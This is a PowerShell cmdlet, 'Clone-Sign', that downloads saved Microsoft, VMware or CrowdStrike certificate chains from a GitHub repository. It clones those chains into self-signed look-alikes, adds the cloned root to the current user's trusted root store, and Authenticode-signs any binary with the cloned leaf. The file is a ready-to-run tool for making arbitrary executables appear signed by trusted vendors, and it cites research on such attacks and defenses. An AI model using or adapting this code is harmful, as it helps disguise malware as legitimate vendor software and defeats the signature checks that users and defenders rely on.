function Clone-Sign
{

<#
.SYNOPSIS
Powershell Cmdlet that allows for ability to easily sign a binary with a cloned certificate chain
.DESCRIPTION
Powershell Cmdlet that allows for ability to easily sign a binary with a cloned certificate chain
.PARAMETER Clone
The stock certificate to use when cloning the signing cert
.PARAMETER SignThis
The filepath of the binary to sign w/ the cloned certificate
.EXAMPLE
PS C:\> Import-Module Clone-Sign
PS C:\> Clone-Sign -c 'vmware' -s 'C:\somebinary.exe'
PS C:\> Clone-Sign -s '.\lol.exe'
.LINK
https://gist.github.com/ahhh/4467b73425601a46bd0fdfaa4fc84ccd
https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html
.NOTES
EZmode cert cloning by pulling some saved cert chains. 
Inspired by Matt Graber
Adopted by ahhh
Check a Signature: "Get-AuthenticodeSignature -FilePath $SignThis"
#>

	[CmdletBinding()] Param(
	
		[Parameter(Mandatory = $false, ValueFromPipeline=$false)]
		[Alias("cert", "clone", "c")]
		[String]
		$CloneThis = 'microsoft',
		
		[Parameter(Mandatory = $true, ValueFromPipeline=$true)]
		[Alias("sign", "file", "s")]
		[String]
		$SignThis = '.\example.exe'
	)


# Setup Cert Store in Reg
$CertStoreLocation = @{ CertStoreLocation = 'Cert:\CurrentUser\My' }
# Setup Cert Store on Disk
[system.io.directory]::CreateDirectory("C:\CertStore")

switch ($CloneThis)
{
    microsoft {
        $rootUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/MS_root3.cer"
        $pcaUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/MS_pca3.cer"
        $leafUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/MS_leaf3.cer"
    }
    vmware {
        $rootUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/vmroot.cer"
        $pcaUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/vmpca.cer"
        $leafUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/vmleaf.cer"
    }
    crowdstrike {
        $rootUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/CSroot.cer"
        $pcaUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/CSpca.cer"
        $leafUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/CSleaf.cer"
    }
    default {
        $rootUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/MS_root3.cer"
        $pcaUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/MS_pca3.cer" 
        $leafUri = "https://raw.githubusercontent.com/ahhh/CloneWars/master/MS_leaf3.cer"
    }
}

# Download Root Cert
Invoke-WebRequest -Uri $rootUri -OutFile "C:\CertStore\rc.cer"
$Root_Cert = Get-PfxCertificate -FilePath C:\CertStore\rc.cer
$Cloned_Root_Cert = New-SelfSignedCertificate -CloneCert $Root_Cert @CertStoreLocation

# Download PCA Cert
Invoke-WebRequest -Uri $pcaUri -OutFile "C:\CertStore\pca.cer"
$PCA_Cert = Get-PfxCertificate -FilePath C:\CertStore\pca.cer
$Cloned_PCA_Cert = New-SelfSignedCertificate -CloneCert $PCA_Cert -Signer $Cloned_Root_Cert @CertStoreLocation

# Download Leaf Cert
Invoke-WebRequest -Uri $leafUri -OutFile "C:\CertStore\leaf.cer"
$Leaf_Cert = Get-PfxCertificate -FilePath C:\CertStore\leaf.cer
$Cloned_Leaf_Cert = New-SelfSignedCertificate -CloneCert $Leaf_Cert -Signer $Cloned_PCA_Cert @CertStoreLocation

# Import our root Cert
Export-Certificate -Type CERT -FilePath C:\CertStore\rcc.cer -Cert $Cloned_Root_Cert
Import-Certificate -FilePath C:\CertStore\rcc.cer -CertStoreLocation Cert:\CurrentUser\Root\

# Sign target binary
Set-AuthenticodeSignature -Certificate $Cloned_Leaf_Cert -FilePath $SignThis

}
